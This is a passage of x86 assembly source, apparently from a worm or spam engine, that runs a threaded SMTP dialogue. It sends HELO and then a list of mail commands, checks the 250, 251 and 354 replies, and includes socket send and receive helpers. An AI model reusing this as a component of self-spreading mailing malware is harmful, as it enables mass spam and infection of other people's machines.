        mov     ecx,dword ptr [heloSize]        ; helloooo

        mov     eax,dword ptr [fd]
        call    writeSocket                     ; write command

        mov     eax,dword ptr [fd]
        call    SResponse                       ; get server response
        cmp     eax,SOCKET_ERR                  ; to helo
        je      exitThrQsocksC
        cmp     eax,' 052'
        jne     exitThrQsocksC        

        lea     edi,cmd
        mov     ecx,nCmd

sendLoop:
        push    ecx

        mov     esi,dword ptr [edi]
        mov     ecx,dword ptr [edi+4]

        mov     eax,dword ptr [fd]
        call    writeSocket                     ; write command
        pop     ecx

        push    ecx
        mov     eax,dword ptr [fd]
        call    SResponse                       ; get server response
        pop     ecx
        cmp     eax,SOCKET_ERR
        je      exitThrQsocksC
        cmp     eax,' 052'
        je      replyOK
        cmp     eax,' 152'
        je      replyOK
        cmp     eax,' 453'
        jne     exitThrQsocksC
replyOK:
        add     edi,8
        loop    sendLoop

exitThrQsocksC:
        push    dword ptr [fd]
        call    closesocket

exitThrQsocks:

exitThr:
        dec     byte ptr [thrSem]

        push    0h                              ; exit Thr
        call    ExitThread 

;
;    IN
;       esi: pointer to buffer
;       ecx: bytes to write
;       eax: socket
;
;    OUT
;       eax: startus
;
writeSocket:
        push    0
        push    ecx
        push    esi
        push    eax
        call    send

        ret

;
;    IN
;       eax: socket
;
;    OUT
;       eax: response
;
SResponse:
        push    eax

        push    0
        push    4
        push    offset response
        push    eax
        call    recv
        cmp     eax,4
        jne     errorSR

readSRLoop:
        pop     eax
        push    eax

        push    0
        push    1
        push    offset responseb
        push    eax
        call    recv
        cmp     eax,1
        jne     noMore
        cmp     byte ptr [responseb],0ah
        jne     readSRLoop

noMore:
        pop     eax
        mov     eax,dword ptr [response]
        ret

errorSR:
        pop     eax
        mov     eax,SOCKET_ERR
        ret


Ends
End inicio
